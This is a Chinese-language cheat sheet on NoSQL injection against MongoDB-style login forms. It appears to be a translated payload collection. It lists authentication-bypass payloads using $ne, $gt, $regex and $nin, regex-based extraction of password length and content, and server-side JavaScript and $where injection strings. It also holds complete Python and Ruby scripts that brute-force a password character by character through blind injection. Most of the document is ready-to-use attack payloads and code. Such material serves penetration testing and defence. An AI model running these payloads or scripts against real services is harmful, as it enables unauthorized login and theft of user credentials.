# NoSQL 注入攻击

> NoSQL数据库比传统SQL数据库提供更宽松的一致性限制。通过减少关系约束和一致性检查，NoSQL数据库通常提供性能和扩展性优势。然而，即使这些数据库不使用传统的SQL语法，它们仍然可能容易受到注入攻击。

## 摘要

* [工具](#工具)
* [利用方法](#利用方法)
  * [绕过认证](#绕过认证)
  * [提取长度信息](#提取长度信息)
  * [提取数据信息](#提取数据信息)
* [盲NoSQL](#盲NoSQL)
  * [带JSON体的POST请求](#带JSON体的POST请求)
  * [带URL编码体的POST请求](#带URL编码体的POST请求)
  * [GET请求](#GET请求)
* [MongoDB有效载荷](#MongoDB有效载荷)
* [参考资料](#参考资料)

## 工具

* [NoSQLmap - 自动化的NoSQL数据库枚举和Web应用利用工具](https://github.com/codingo/NoSQLMap)
* [nosqlilab - 用于尝试NoSQL注入的实验室](https://github.com/digininja/nosqlilab)
* [Burp-NoSQLiScanner - Burp Suite中的插件](https://github.com/matrix/Burp-NoSQLiScanner)

## 利用方法

### 绕过认证

使用不等于($ne)或大于($gt)来绕过基本认证

```json
在DATA中
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto

在JSON中
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

### 提取长度信息

```json
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

### 提取数据信息

```json
在URL中
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

在JSON中
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

提取包含"in"的数据

```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

### SSJI

```json
';return 'a'=='a' && ''=='
";return 'a'=='a' && ''=='
0;return true
```

## 盲注NoSQL

### 带有JSON正文的POST请求

python脚本:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("找到更多字符 : %s" % (password+c))
                password += c
```

### 带有urlencode正文的POST请求

python脚本:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("找到更多字符 : %s" % (password+c))
                password += c
```

### GET请求

python脚本:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(f"找到更多字符 : {password+c}")
        password += c
```

ruby脚本:

```ruby
require 'httpx'

username = 'admin'
password = ''
url = 'http://example.org/login'
# CHARSET = (?!..?~).to_a # 所有ASCII可打印字符
CHARSET = [*'0'..'9',*'a'..'z','-'] # 字母数字 + '-'
GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
session = HTTPX.plugin(:persistent)

while true
  CHARSET.each do |c|
    unless GET_EXCLUDE.include?(c)
      payload = "?username=#{username}&password[$regex]=^#{password + c}"
      res = session.get(url + payload)
      if res.body.to_s.match?('Yeah')
        puts "找到更多字符 : #{password + c}"
        password += c
      end
    end
  end
end
```

## MongoDB有效载荷

```bash
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a\
' } ], $comment:'成功的MongoDB注入'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1\
|| 1==1\
' && this.password.match(/.*/)//+%00\
' && this.passwordzz.match(/.*/)//+%00\
'%20%26%26%20this.password.match(/.*/)//+%00\
'%20%26%26%20this.passwordzz.match(/.*/)//+%00\
{$gt: ''}
[$ne]=1
';return 'a'=='a' && ''=='\
";return(true);var xyz='a\
0;return true
```

## 参考资料

* [经典与盲注NoSQL注入：永远不要信任用户输入 - Geluchat](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
* [测试NoSQL注入 - OWASP/WSTG](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
* [NoSQL注入词表 - cr0hn](https://github.com/cr0hn/nosqlinjection_wordlists)
* [MongoDB中的NoSQL注入 - 2016年7月17日 - Zanon](https://zanon.io/posts/nosql-injection-in-mongodb)
* [Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
